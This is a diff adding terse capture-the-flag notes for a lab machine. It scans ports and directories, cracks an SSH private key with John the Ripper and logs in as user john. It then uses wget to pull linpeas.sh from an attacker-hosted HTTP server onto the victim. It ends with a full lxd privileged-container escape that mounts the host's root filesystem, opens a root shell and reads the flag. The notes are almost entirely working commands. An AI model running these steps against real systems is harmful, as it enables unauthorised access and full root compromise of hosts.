@@ -1,0 +1,65 @@
+open ports: 
+22 ssh 
+80 http Apache httpd 2.4.29 (Ubuntu)
+
+| Directory check:
+| [+] CODE: 200 URL: http://10.10.53.241/secret/
+| [+] CODE: 200 URL: http://10.10.53.241/uploads/
+================================================================================================
+| File check:
+| [+] CODE: 200 URL: http://10.10.53.241/index.html
+| [+] CODE: 200 URL: http://10.10.53.241/robots.txt
+
+robots.txt
+user-agent: *
+Allow: /
+/uploads/
+
+wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
+python ssh2john.py secretKey > id_rsa.hash 
+john --wordlist=dict.lst id_rsa.hash 
+
+user: john (from page_source)
+passwd: letmein
+
+sudo chmod 600 secretKey
+ssh -i secretKey john@10.10.53.241
+
+in folder contain linpeas.sh
+*attacker machine*
+sudo python3 -m http.server
+*victim machine*
+wget attacker_ip:8000/linpeas.sh
+
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+
+*** fix error ***
+	Go into rootfs/use/share directory
+cd rootfs/usr/share/
+	Create the alpine-mirrors directory
+mkdir alpine-mirrors
+	Go into the alpine-mirrors directory, create a file called MIRRORS.txt
+cd alpine-mirrors/
+vi MIRRORS.txt
+	Add in the following link into MIRRORS.txt file
+http://alpine.mirror.wearetriple.com
+	Save the MIRRORS.txt file and then run the build-alpine again.
+sudo ./build-alpine
+
+cd lxd-alpine-builder
+python3 -m SimpleHTTPServer
+
+	import the image by running:
+
+lxc image import ./alpine-v3.12-x86_64-20200830_2354.tar.gz --alias myimage
+	
+	then spawn a root shell by running this list of commands
+
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+whoami
+cat mnt/root/root/flag.txt
